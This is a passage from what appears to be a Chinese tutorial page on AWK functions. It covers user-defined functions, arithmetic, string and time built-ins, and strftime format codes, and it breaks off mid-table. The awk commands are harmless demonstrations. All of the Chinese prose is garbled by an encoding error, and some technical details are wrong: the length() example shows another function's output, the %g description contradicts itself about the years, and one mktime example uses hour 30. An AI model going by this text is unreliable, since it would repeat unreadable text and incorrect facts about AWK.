<p>åœ¨æ•°ç»„ä¸Šå¯ä»¥æ‰§è¡Œå¾ˆå¤šæ“ä½œï¼Œæ¯”å¦‚ï¼Œä½¿ç”¨ asort å®Œæˆæ•°ç»„å…ƒç´ çš„æ’åºï¼Œæˆ–è€…ä½¿ç”¨ asorti å®ç°æ•°ç»„ç´¢å¼•çš„æ’åºç­‰ç­‰ã€‚</p>
<h4 id="AWK-ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°">AWK ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°</h4>
<p>è‡ªå®šä¹‰å‡½æ•°çš„è¯­æ³•æ ¼å¼ä¸ºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> function_name(argument1, argument2, ...)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">function</span> body</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä»¥ä¸‹å®ä¾‹å®ç°äº†ä¸¤ä¸ªç®€å•å‡½æ•°ï¼Œå®ƒä»¬åˆ†åˆ«è¿”å›ä¸¤ä¸ªæ•°å€¼ä¸­çš„æœ€å°å€¼å’Œæœ€å¤§å€¼ã€‚</p>
<p>æ–‡ä»¶ functions.awk ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è¿”å›æœ€å°å€¼</span></span><br><span class="line"><span class="keyword">function</span> find_min(num1, num2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (num1 &lt; num2)</span><br><span class="line">    <span class="built_in">return</span> num1</span><br><span class="line">  <span class="built_in">return</span> num2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿”å›æœ€å¤§å€¼</span></span><br><span class="line"><span class="keyword">function</span> find_max(num1, num2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (num1 &gt; num2)</span><br><span class="line">    <span class="built_in">return</span> num1</span><br><span class="line">  <span class="built_in">return</span> num2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸»å‡½æ•°</span></span><br><span class="line"><span class="keyword">function</span> main(num1, num2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment"># æŸ¥æ‰¾æœ€å°å€¼</span></span><br><span class="line">  result = find_min(10, 20)</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Minimum =&quot;</span>, result</span><br><span class="line"></span><br><span class="line">  <span class="comment"># æŸ¥æ‰¾æœ€å¤§å€¼</span></span><br><span class="line">  result = find_max(10, 20)</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Maximum =&quot;</span>, result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># è„šæœ¬ä»è¿™é‡Œå¼€å§‹æ‰§è¡Œ</span></span><br><span class="line">BEGIN &#123;</span><br><span class="line">  main(10, 20)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œ functions.awk æ–‡ä»¶ï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹çš„ç»“æœï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk -f functions.awk </span><br><span class="line">Minimum = 10</span><br><span class="line">Maximum = 20</span><br></pre></td></tr></table></figure>
<h4 id="AWK-å†…ç½®å‡½æ•°">AWK å†…ç½®å‡½æ•°</h4>
<p>AWK å†…ç½®å‡½æ•°ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>ç®—æ•°å‡½æ•°</p>
</li>
<li class="lvl-2">
<p>å­—ç¬¦ä¸²å‡½æ•°</p>
</li>
<li class="lvl-2">
<p>æ—¶é—´å‡½æ•°</p>
</li>
<li class="lvl-2">
<p>ä½æ“ä½œå‡½æ•°</p>
</li>
<li class="lvl-2">
<p>å…¶å®ƒå‡½æ•°</p>
</li>
</ul>
<h4 id="ç®—æ•°å‡½æ•°">ç®—æ•°å‡½æ•°</h4>
<table>
<thead>
<tr>
<th><strong>å‡½æ•°å</strong></th>
<th><strong>è¯´æ˜</strong></th>
<th><strong>å®ä¾‹</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>atan2( y, x )</td>
<td>è¿”å› y/x çš„åæ­£åˆ‡ã€‚</td>
<td><code>$ awk 'BEGIN &#123; PI = 3.14159265 x = -10 y = 10 result = atan2 (y,x) * 180 / PI; printf &quot;The arc tangent for (x=%f, y=%f) is %f degrees\n&quot;, x, y,  result &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>The arc tangent for (x=-10.000000, y=10.000000) is 135.000000 degrees</code></td>
</tr>
<tr>
<td>cos( x )</td>
<td>è¿”å› x çš„ä½™å¼¦ï¼›x æ˜¯å¼§åº¦ã€‚</td>
<td><code>$ awk 'BEGIN &#123; PI = 3.14159265 param = 60 result = cos(param * PI /  180.0); printf &quot;The cosine of %f degrees is %f.\n&quot;, param, result &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>The cosine of 60.000000 degrees is 0.500000.</code></td>
</tr>
<tr>
<td>sin( x )</td>
<td>è¿”å› x çš„æ­£å¼¦ï¼›x æ˜¯å¼§åº¦ã€‚</td>
<td><code>$ awk 'BEGIN &#123; PI = 3.14159265 param = 30.0 result = sin(param * PI /180) printf &quot;The sine of %f degrees is %f.\n&quot;, param, result &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>The sine of 30.000000 degrees is 0.500000.</code></td>
</tr>
<tr>
<td>exp( x )</td>
<td>è¿”å› x å¹‚å‡½æ•°ã€‚</td>
<td><code>$ awk 'BEGIN &#123; param = 5 result = exp(param); printf &quot;The exponential value of %f is %f.\n&quot;, param, result &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>The exponential value of 5.000000 is 148.413159.</code></td>
</tr>
<tr>
<td>log( x )</td>
<td>è¿”å› x çš„è‡ªç„¶å¯¹æ•°ã€‚</td>
<td><code>$ awk 'BEGIN &#123; param = 5.5 result = log (param) printf &quot;log(%f) = %f\n&quot;, param, result &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>log(5.500000) = 1.704748</code></td>
</tr>
<tr>
<td>sqrt( x )</td>
<td>è¿”å› x å¹³æ–¹æ ¹ã€‚</td>
<td><code>$ awk 'BEGIN &#123; param = 1024.0 result = sqrt(param) printf &quot;sqrt(%f) = %f\n&quot;, param, result &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>sqrt(1024.000000) = 32.000000</code></td>
</tr>
<tr>
<td>int( x )</td>
<td>è¿”å› x çš„æˆªæ–­è‡³æ•´æ•°çš„å€¼ã€‚</td>
<td><code>$ awk 'BEGIN &#123; param = 5.12345 result = int(param) print &quot;Truncated value =&quot;, result &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>Truncated value = 5</code></td>
</tr>
<tr>
<td>rand( )</td>
<td>è¿”å›ä»»æ„æ•°å­— nï¼Œå…¶ä¸­ 0 &lt;= n &lt; 1ã€‚</td>
<td><code>$ awk 'BEGIN &#123; print &quot;Random num1 =&quot; , rand() print &quot;Random num2 =&quot; , rand() print &quot;Random num3 =&quot; , rand() &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>Random num1 = 0.237788 Random num2 = 0.291066 Random num3 = 0.845814</code></td>
</tr>
<tr>
<td>srand( [Expr] )</td>
<td>å°† rand å‡½æ•°çš„ç§å­å€¼è®¾ç½®ä¸º Expr å‚æ•°çš„å€¼ï¼Œæˆ–å¦‚æœçœç•¥ Expr å‚æ•°åˆ™ä½¿ç”¨æŸå¤©çš„æ—¶é—´ã€‚è¿”å›å…ˆå‰çš„ç§å­å€¼ã€‚</td>
<td><code>$ awk 'BEGIN &#123; param = 10 printf &quot;srand() = %d\n&quot;, srand() printf &quot;srand(%d) = %d\n&quot;, param, srand(param) &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>srand() = 1 srand(10) = 1417959587</code></td>
</tr>
</tbody>
</table>
<h5 id="å­—ç¬¦ä¸²å‡½æ•°">å­—ç¬¦ä¸²å‡½æ•°</h5>
<table>
<thead>
<tr>
<th><strong>å‡½æ•°</strong></th>
<th><strong>è¯´æ˜</strong></th>
<th><strong>å®ä¾‹</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>gsub( Ere, Repl, [ In ] )</td>
<td>gsub æ˜¯å…¨å±€æ›¿æ¢( global substitution )çš„ç¼©å†™ã€‚é™¤äº†æ­£åˆ™è¡¨è¾¾å¼æ‰€æœ‰å…·ä½“å€¼è¢«æ›¿ä»£è¿™ç‚¹ï¼Œå®ƒå’Œ sub å‡½æ•°å®Œå…¨ä¸€æ ·åœ°æ‰§è¡Œã€‚</td>
<td><code>$ awk 'BEGIN &#123; str = &quot;Hello, World&quot; print &quot;String before replacement = &quot;  str gsub(&quot;World&quot;, &quot;Jerry&quot;, str) print &quot;String after replacement = &quot; str  &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>String before replacement = Hello, World String after replacement = Hello, Jerry</code></td>
</tr>
<tr>
<td>sub(regex,sub,string)</td>
<td>sub å‡½æ•°æ‰§è¡Œä¸€æ¬¡å­ä¸²æ›¿æ¢ã€‚å®ƒå°†ç¬¬ä¸€æ¬¡å‡ºç°çš„å­ä¸²ç”¨ regex æ›¿æ¢ã€‚ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯å¯é€‰çš„ï¼Œé»˜è®¤ä¸º $0ã€‚</td>
<td><code>$ awk 'BEGIN &#123; str = &quot;Hello, World&quot; print &quot;String before replacement = &quot;  str sub(&quot;World&quot;, &quot;Jerry&quot;, str) print &quot;String after replacement = &quot; str  &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>String before replacement = Hello, World String after replacement = Hello, Jerry</code></td>
</tr>
<tr>
<td>substr(str, start, l)</td>
<td>substr å‡½æ•°è¿”å› str å­—ç¬¦ä¸²ä¸­ä»ç¬¬ start ä¸ªå­—ç¬¦å¼€å§‹é•¿åº¦ä¸º l çš„å­ä¸²ã€‚å¦‚æœæ²¡æœ‰æŒ‡å®š l çš„å€¼ï¼Œè¿”å› str ä»ç¬¬ start ä¸ªå­—ç¬¦å¼€å§‹çš„åç¼€å­ä¸²ã€‚</td>
<td><code>$ awk 'BEGIN &#123; str = &quot;Hello, World !!!&quot; subs = substr(str, 1, 5) print &quot;Substring = &quot; subs &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>Substring = Hello</code></td>
</tr>
<tr>
<td>index( String1, String2 )</td>
<td>åœ¨ç”± String1 å‚æ•°æŒ‡å®šçš„å­—ç¬¦ä¸²ï¼ˆå…¶ä¸­æœ‰å‡ºç° String2 æŒ‡å®šçš„å‚æ•°ï¼‰ä¸­ï¼Œè¿”å›ä½ç½®ï¼Œä» 1 å¼€å§‹ç¼–å·ã€‚å¦‚æœ String2 å‚æ•°ä¸åœ¨ String1 å‚æ•°ä¸­å‡ºç°ï¼Œåˆ™è¿”å› 0ï¼ˆé›¶ï¼‰ã€‚</td>
<td><code>$ awk 'BEGIN &#123; str = &quot;One Two Three&quot; subs = &quot;Two&quot; ret = index(str, subs)  printf &quot;Substring \&quot;%s\&quot; found at %d location.\n&quot;, subs, ret &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>Substring &quot;Two&quot; found at 5 location.</code></td>
</tr>
<tr>
<td>length [(String)]</td>
<td>è¿”å› String å‚æ•°æŒ‡å®šçš„å­—ç¬¦ä¸²çš„é•¿åº¦ï¼ˆå­—ç¬¦å½¢å¼ï¼‰ã€‚å¦‚æœæœªç»™å‡º String å‚æ•°ï¼Œåˆ™è¿”å›æ•´ä¸ªè®°å½•çš„é•¿åº¦ï¼ˆ$0 è®°å½•å˜é‡ï¼‰ã€‚</td>
<td><code>$ awk 'BEGIN &#123; str = &quot;Hello, World !!!&quot; print &quot;Length = &quot;, length(str) &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>Substring &quot;Two&quot; found at 5 location.</code></td>
</tr>
<tr>
<td>blength [(String)]</td>
<td>è¿”å› String å‚æ•°æŒ‡å®šçš„å­—ç¬¦ä¸²çš„é•¿åº¦ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚å¦‚æœæœªç»™å‡º String å‚æ•°ï¼Œåˆ™è¿”å›æ•´ä¸ªè®°å½•çš„é•¿åº¦ï¼ˆ$0 è®°å½•å˜é‡ï¼‰ã€‚</td>
<td></td>
</tr>
<tr>
<td>substr( String, M, [ N ] )</td>
<td>è¿”å›å…·æœ‰ N å‚æ•°æŒ‡å®šçš„å­—ç¬¦æ•°é‡å­ä¸²ã€‚å­ä¸²ä» String å‚æ•°æŒ‡å®šçš„å­—ç¬¦ä¸²å–å¾—ï¼Œå…¶å­—ç¬¦ä»¥ M å‚æ•°æŒ‡å®šçš„ä½ç½®å¼€å§‹ã€‚M å‚æ•°æŒ‡å®šä¸ºå°† String  å‚æ•°ä¸­çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä½œä¸ºç¼–å· 1ã€‚å¦‚æœæœªæŒ‡å®š N å‚æ•°ï¼Œåˆ™å­ä¸²çš„é•¿åº¦å°†æ˜¯ M å‚æ•°æŒ‡å®šçš„ä½ç½®åˆ° String å‚æ•°çš„æœ«å°¾ çš„é•¿åº¦ã€‚</td>
<td><code>$ awk 'BEGIN &#123; str = &quot;Hello, World !!!&quot; subs = substr(str, 1, 5) print &quot;Substring = &quot; subs &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>Substring = Hello</code></td>
</tr>
<tr>
<td>match( String, Ere )</td>
<td>åœ¨ String å‚æ•°æŒ‡å®šçš„å­—ç¬¦ä¸²ï¼ˆEre å‚æ•°æŒ‡å®šçš„æ‰©å±•æ­£åˆ™è¡¨è¾¾å¼å‡ºç°åœ¨å…¶ä¸­ï¼‰ä¸­è¿”å›ä½ç½®ï¼ˆå­—ç¬¦å½¢å¼ï¼‰ï¼Œä» 1 å¼€å§‹ç¼–å·ï¼Œæˆ–å¦‚æœ Ere  å‚æ•°ä¸å‡ºç°ï¼Œåˆ™è¿”å› 0ï¼ˆé›¶ï¼‰ã€‚RSTART ç‰¹æ®Šå˜é‡è®¾ç½®ä¸ºè¿”å›å€¼ã€‚RLENGTH  ç‰¹æ®Šå˜é‡è®¾ç½®ä¸ºåŒ¹é…çš„å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œæˆ–å¦‚æœæœªæ‰¾åˆ°ä»»ä½•åŒ¹é…ï¼Œåˆ™è®¾ç½®ä¸º -1ï¼ˆè´Ÿä¸€ï¼‰ã€‚</td>
<td><code>$  awk 'BEGIN &#123; str = &quot;One Two Three&quot; subs = &quot;Two&quot; ret = match(str, subs)  printf &quot;Substring \&quot;%s\&quot; found at %d location.\n&quot;, subs, ret &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>Substring &quot;Two&quot; found at 5 location.</code></td>
</tr>
<tr>
<td>split( String, A, [Ere] )</td>
<td>å°† String å‚æ•°æŒ‡å®šçš„å‚æ•°åˆ†å‰²ä¸ºæ•°ç»„å…ƒç´  A[1], A[2], . . ., A[n]ï¼Œå¹¶è¿”å› n å˜é‡çš„å€¼ã€‚æ­¤åˆ†éš”å¯ä»¥é€šè¿‡ Ere  å‚æ•°æŒ‡å®šçš„æ‰©å±•æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œï¼Œæˆ–ç”¨å½“å‰å­—æ®µåˆ†éš”ç¬¦ï¼ˆFS ç‰¹æ®Šå˜é‡ï¼‰æ¥è¿›è¡Œï¼ˆå¦‚æœæ²¡æœ‰ç»™å‡º Ere  å‚æ•°ï¼‰ã€‚é™¤éä¸Šä¸‹æ–‡æŒ‡æ˜ç‰¹å®šçš„å…ƒç´ è¿˜åº”å…·æœ‰ä¸€ä¸ªæ•°å­—å€¼ï¼Œå¦åˆ™ A æ•°ç»„ä¸­çš„å…ƒç´ ç”¨å­—ç¬¦ä¸²å€¼æ¥åˆ›å»ºã€‚</td>
<td><code>$ awk 'BEGIN &#123; str = &quot;One,Two,Three,Four&quot; split(str, arr, &quot;,&quot;) print  &quot;Array contains following values&quot; for (i in arr) &#123; print arr[i] &#125; &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>Array contains following values One Two Three Four</code></td>
</tr>
<tr>
<td>tolower( String )</td>
<td>è¿”å› String å‚æ•°æŒ‡å®šçš„å­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²ä¸­æ¯ä¸ªå¤§å†™å­—ç¬¦å°†æ›´æ”¹ä¸ºå°å†™ã€‚å¤§å†™å’Œå°å†™çš„æ˜ å°„ç”±å½“å‰è¯­è¨€ç¯å¢ƒçš„ LC_CTYPE èŒƒç•´å®šä¹‰ã€‚</td>
<td><code>$ awk 'BEGIN &#123; str = &quot;HELLO, WORLD !!!&quot; print &quot;Lowercase string = &quot; tolower(str) &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>Lowercase string = hello, world !!!</code></td>
</tr>
<tr>
<td>toupper( String )</td>
<td>è¿”å› String å‚æ•°æŒ‡å®šçš„å­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²ä¸­æ¯ä¸ªå°å†™å­—ç¬¦å°†æ›´æ”¹ä¸ºå¤§å†™ã€‚å¤§å†™å’Œå°å†™çš„æ˜ å°„ç”±å½“å‰è¯­è¨€ç¯å¢ƒçš„ LC_CTYPE èŒƒç•´å®šä¹‰ã€‚</td>
<td><code>$ awk 'BEGIN &#123; str = &quot;hello, world !!!&quot; print &quot;Uppercase string = &quot; toupper(str) &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>Uppercase string = HELLO, WORLD !!!</code></td>
</tr>
<tr>
<td>sprintf(Format, Expr, Expr, . . . )</td>
<td>æ ¹æ® Format å‚æ•°æŒ‡å®šçš„ printf å­ä¾‹ç¨‹æ ¼å¼å­—ç¬¦ä¸²æ¥æ ¼å¼åŒ– Expr å‚æ•°æŒ‡å®šçš„è¡¨è¾¾å¼å¹¶è¿”å›æœ€åç”Ÿæˆçš„å­—ç¬¦ä¸²ã€‚</td>
<td><code>$ awk 'BEGIN &#123; str = sprintf(&quot;%s&quot;, &quot;Hello, World !!!&quot;) print str &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>Hello, World !!!</code></td>
</tr>
<tr>
<td>strtonum(str)</td>
<td>strtonum å°†å­—ç¬¦ä¸² str è½¬æ¢ä¸ºæ•°å€¼ã€‚ å¦‚æœå­—ç¬¦ä¸²ä»¥ 0 å¼€å§‹ï¼Œåˆ™å°†å…¶å½“ä½œåè¿›åˆ¶æ•°ï¼›å¦‚æœå­—ç¬¦ä¸²ä»¥ 0x æˆ– 0X å¼€å§‹ï¼Œåˆ™å°†å…¶å½“ä½œåå…­è¿›åˆ¶æ•°ï¼›å¦åˆ™ï¼Œå°†å…¶å½“ä½œæµ®ç‚¹æ•°ã€‚</td>
<td><code>$ awk 'BEGIN &#123; print &quot;Decimal num = &quot; strtonum(&quot;123&quot;) print &quot;Octal num = &quot; strtonum(&quot;0123&quot;) print &quot;Hexadecimal num = &quot; strtonum(&quot;0x123&quot;) &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>Decimal num = 123 Octal num = 83 Hexadecimal num = 291</code></td>
</tr>
</tbody>
</table>
<p>**æ³¨ï¼š**<strong>Ere</strong> éƒ¨åˆ†å¯ä»¥æ˜¯æ­£åˆ™è¡¨è¾¾å¼ã€‚</p>
<p><strong>1ã€gsubã€sub ä½¿ç”¨</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN&#123;info=&quot;this is a test2012test!&quot;;gsub(/[0-9]+/,&quot;||&quot;,info);print info&#125;&#x27;</span></span><br><span class="line">this is a <span class="built_in">test</span>||<span class="built_in">test</span>!</span><br></pre></td></tr></table></figure>
<p><strong>2ã€æŸ¥æ‰¾å­—ç¬¦ä¸²ï¼ˆindex ä½¿ç”¨ï¼‰</strong></p>
<p>ä½¿ç”¨äº†ä¸‰å…ƒè¿ç®—ç¬¦: <strong>è¡¨è¾¾å¼ ? åŠ¨ä½œ1 : åŠ¨ä½œ2</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN&#123;info=&quot;this is a test2012test!&quot;;print index(info,&quot;11111&quot;)?&quot;ok&quot;:&quot;no found&quot;;&#125;&#x27;</span></span><br><span class="line">no found</span><br><span class="line">$ awk <span class="string">&#x27;BEGIN&#123;info=&quot;this is a test2012test!&quot;;print index(info,&quot;is&quot;)?&quot;ok&quot;:&quot;no found&quot;;&#125;&#x27;</span></span><br><span class="line">ok</span><br><span class="line">$ awk <span class="string">&#x27;BEGIN&#123;info=&quot;this is a test2012test!&quot;;print index(info,&quot;test&quot;)?&quot;ok&quot;:&quot;no found&quot;;&#125;&#x27;</span></span><br><span class="line">ok</span><br></pre></td></tr></table></figure>
<p><strong>3ã€æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…æŸ¥æ‰¾(match ä½¿ç”¨ï¼‰</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN&#123;info=&quot;this is a test2012test!&quot;;print match(info,/[0-9]+/)?&quot;ok&quot;:&quot;no found&quot;;&#125;&#x27;</span></span><br><span class="line">ok</span><br></pre></td></tr></table></figure>
<p><strong>4ã€æˆªå–å­—ç¬¦ä¸²(substrä½¿ç”¨ï¼‰</strong></p>
<p>ä»ç¬¬ 4 ä¸ª å­—ç¬¦å¼€å§‹ï¼Œæˆªå– 10 ä¸ªé•¿åº¦å­—ç¬¦ä¸²ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN&#123;info=&quot;this is a test2012test!&quot;;print substr(info,4,10);&#125;&#x27;</span></span><br><span class="line">s is a tes</span><br></pre></td></tr></table></figure>
<p><strong>5ã€å­—ç¬¦ä¸²åˆ†å‰²ï¼ˆsplitä½¿ç”¨ï¼‰</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN&#123;info=&quot;this is a test&quot;;split(info,tA,&quot; &quot;);print length(tA);for(k in tA)&#123;print k,tA[k];&#125;&#125;&#x27;</span></span><br><span class="line">4</span><br><span class="line">2 is</span><br><span class="line">3 a</span><br><span class="line">4 <span class="built_in">test</span></span><br><span class="line">1 this</span><br></pre></td></tr></table></figure>
<p>åˆ†å‰² infoï¼Œå°† info å­—ç¬¦ä¸²ä½¿ç”¨ç©ºæ ¼åˆ‡åˆ†ä¸ºåŠ¨æ€æ•°ç»„ tAã€‚æ³¨æ„ awk for â€¦in å¾ªç¯ï¼Œæ˜¯ä¸€ä¸ªæ— åºçš„å¾ªç¯ã€‚ å¹¶ä¸æ˜¯ä»æ•°ç»„ä¸‹æ ‡ 1â€¦n ï¼Œå› æ­¤ä½¿ç”¨æ—¶å€™éœ€è¦ç‰¹åˆ«æ³¨æ„ã€‚</p>
<h5 id="æ—¶é—´å‡½æ•°">æ—¶é—´å‡½æ•°</h5>
<table>
<thead>
<tr>
<th><strong>å‡½æ•°å</strong></th>
<th><strong>è¯´æ˜</strong></th>
<th><strong>å®ä¾‹</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>mktime( YYYY MM DD HH MM SS[ DST])</td>
<td>ç”Ÿæˆæ—¶é—´æ ¼å¼</td>
<td><code>$ awk 'BEGIN &#123; print &quot;Number of seconds since the Epoch = &quot; mktime(&quot;2014 12 14 30 20 10&quot;) &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>Number of seconds since the Epoch = 1418604610</code></td>
</tr>
<tr>
<td>strftime([format [, timestamp]])</td>
<td>æ ¼å¼åŒ–æ—¶é—´è¾“å‡ºï¼Œå°†æ—¶é—´æˆ³è½¬ä¸ºæ—¶é—´å­—ç¬¦ä¸² å…·ä½“æ ¼å¼ï¼Œè§ä¸‹è¡¨.</td>
<td><code>$ awk 'BEGIN &#123; print strftime(&quot;Time = %m/%d/%Y %H:%M:%S&quot;, systime()) &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>Time = 12/14/2014 22:08:42</code></td>
</tr>
<tr>
<td>systime()</td>
<td>å¾—åˆ°æ—¶é—´æˆ³,è¿”å›ä»1970å¹´1æœˆ1æ—¥å¼€å§‹åˆ°å½“å‰æ—¶é—´(ä¸è®¡é—°å¹´)çš„æ•´ç§’æ•°</td>
<td><code>awk 'BEGIN&#123;now=systime();print now&#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>1343210982</code></td>
</tr>
</tbody>
</table>
<p>strftime æ—¥æœŸå’Œæ—¶é—´æ ¼å¼è¯´æ˜ç¬¦:</p>
<table>
<thead>
<tr>
<th>åºå·</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td>%a</td>
<td>æ˜ŸæœŸç¼©å†™(Mon-Sun)ã€‚</td>
</tr>
<tr>
<td>%A</td>
<td>æ˜ŸæœŸå…¨ç§°ï¼ˆMonday-Sundayï¼‰ã€‚</td>
</tr>
<tr>
<td>%b</td>
<td>æœˆä»½ç¼©å†™ï¼ˆJanï¼‰ã€‚</td>
</tr>
<tr>
<td>%B</td>
<td>æœˆä»½å…¨ç§°ï¼ˆJanuaryï¼‰ã€‚</td>
</tr>
<tr>
<td>%c</td>
<td>æœ¬åœ°æ—¥æœŸä¸æ—¶é—´ã€‚</td>
</tr>
<tr>
<td>%C</td>
<td>å¹´ä»½ä¸­çš„ä¸–çºªéƒ¨åˆ†ï¼Œå…¶å€¼ä¸ºå¹´ä»½æ•´é™¤100ã€‚</td>
</tr>
<tr>
<td>%d</td>
<td>åè¿›åˆ¶æ—¥æœŸ(01-31)</td>
</tr>
<tr>
<td>%D</td>
<td>ç­‰ä»·äº %m/%d/%y.</td>
</tr>
<tr>
<td>%e</td>
<td>æ—¥æœŸï¼Œå¦‚æœåªæœ‰ä¸€ä½æ•°å­—åˆ™ç”¨ç©ºæ ¼è¡¥é½</td>
</tr>
<tr>
<td>%F</td>
<td>ç­‰ä»·äº %Y-%m-%dï¼Œè¿™ä¹Ÿæ˜¯ ISO 8601 æ ‡å‡†æ—¥æœŸæ ¼å¼ã€‚</td>
</tr>
<tr>
<td>%g</td>
<td>ISO8610 æ ‡å‡†å‘¨æ‰€åœ¨çš„å¹´ä»½æ¨¡é™¤ 100ï¼ˆ00-99)ã€‚æ¯”å¦‚ï¼Œ1993 å¹´ 1 æœˆ 1 æ—¥å±äº 1992 å¹´çš„ç¬¬ 53 å‘¨ã€‚æ‰€ä»¥ï¼Œè™½ç„¶å®ƒæ˜¯ 1993 å¹´ç¬¬ 1 å¤©ï¼Œä½†æ˜¯å…¶ã€€ISO8601 æ ‡å‡†å‘¨æ‰€åœ¨å¹´ä»½å´æ˜¯ 1992ã€‚åŒæ ·ï¼Œå°½ç®¡ 1973 å¹´ 12 æœˆ 31 æ—¥å±äº 1973 å¹´ä½†æ˜¯å®ƒå´å±äº  1994 å¹´çš„ç¬¬ä¸€å‘¨ã€‚æ‰€ä»¥ 1973 å¹´ 12 æœˆ 31 æ—¥çš„ ISO8610ã€€æ ‡å‡†å‘¨æ‰€åœ¨çš„å¹´æ˜¯ 1974 è€Œä¸æ˜¯ 1973ã€‚</td>
</tr>
<tr>
<td>%G</td>
<td>ISO æ ‡å‡†å‘¨æ‰€åœ¨å¹´ä»½çš„å…¨ç§°ã€‚</td>
</tr>
<tr>
<td>%h</td>
<td>ç­‰ä»·äº %b.</td>
</tr>
<tr>
<td>%H</td>
<td>ç”¨åè¿›åˆ¶è¡¨ç¤ºçš„ 24 å°æ—¶æ ¼å¼çš„å°æ—¶(00-23)</td>
</tr>
<tr>
<td>%I</td>
<td>ç”¨åè¿›åˆ¶è¡¨ç¤ºçš„ 12 å°æ—¶æ ¼å¼çš„å°æ—¶ï¼ˆ00-12ï¼‰</td>
</tr>
<tr>
<td>%j</td>
<td>ä¸€å¹´ä¸­çš„ç¬¬å‡ å¤©ï¼ˆ001-366ï¼‰</td>
</tr>
<tr>
<td>%m</td>
<td>æœˆä»½ï¼ˆ01-12ï¼‰</td>
</tr>
<tr>
<td>%M</td>
<td>åˆ†é’Ÿæ•°ï¼ˆ00-59)</td>
</tr>
<tr>
<td>%n</td>
<td>æ¢è¡Œç¬¦ (ASCII LF)</td>
</tr>
<tr>
<td>%p</td>
<td>åäºŒè¿›åˆ¶è¡¨ç¤ºæ³•ï¼ˆAM/PMï¼‰</td>
</tr>
<tr>
<td>%r</td>
<td>åäºŒè¿›åˆ¶è¡¨ç¤ºæ³•çš„æ—¶é—´ï¼ˆç­‰ä»·äº %I:%M:%S %pï¼‰ã€‚</td>
</tr>
<tr>
<td>%R</td>
<td>ç­‰ä»·äº %H:%Mã€‚</td>
</tr>
<tr>
<td>%S</td>
<td>æ—¶é—´çš„ç§’æ•°å€¼ï¼ˆ00-60ï¼‰</td>
</tr>
<tr>
<td>%t</td>
<td>åˆ¶è¡¨ç¬¦ (tab)</td>
</tr>
<tr>
<td>%T</td>
<td>ç­‰ä»·äº %H:%M:%Sã€‚</td>
</tr>
<tr>
<td>%u</td>
<td>ä»¥æ•°å­—è¡¨ç¤ºçš„æ˜ŸæœŸ(1-7),1 è¡¨ç¤ºæ˜ŸæœŸä¸€ã€‚</td>
</tr>
<tr>
<td>%U</td>
